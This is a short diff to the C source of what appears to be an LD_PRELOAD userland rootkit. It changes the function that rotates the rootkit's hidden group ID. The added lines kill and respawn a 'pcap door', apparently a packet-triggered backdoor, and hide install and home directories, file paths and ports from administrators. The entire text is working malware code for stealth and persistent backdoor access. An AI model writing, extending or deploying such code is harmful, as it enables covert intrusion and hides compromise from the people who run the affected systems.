@@ -21,6 +21,9 @@ gid_t changerkgid(void){
     FILE *fp;
     gid_t newgid=0;
     char buf[16];
+#ifdef USE_ICMP_BD
+    gid_t oldgid=readgid();
+#endif
 
     hook(CFOPEN, CFWRITE, CCHMOD);
 
@@ -35,6 +38,12 @@ gid_t changerkgid(void){
     call(CFWRITE, buf, 1, strlen(buf), fp);
     fclose(fp);
 
+#ifdef USE_ICMP_BD
+    /* kill&respawn the pcap door */
+    killrkprocs(oldgid-1);
+    spawnpdoor();
+#endif
+
     char *preloadpath = OLD_PRELOAD;
 #ifdef PATCH_DYNAMIC_LINKER
     preloadpath = PRELOAD_FILE;
@@ -43,8 +52,8 @@ gid_t changerkgid(void){
     hidedircontents(INSTALL_DIR, newgid);
     hidedircontents(HOMEDIR, newgid);
 
-    for(int i = 0; i != TOGPATHS_SIZE; i++)
-        chown_path(togpaths[i], newgid);
+    for(int i = 0; i != BDVPATHS_SIZE; i++)
+        chown_path(bdvpaths[i], newgid);
 
 #ifdef HIDE_PORTS
     chown_path(HIDEPORTS, newgid);
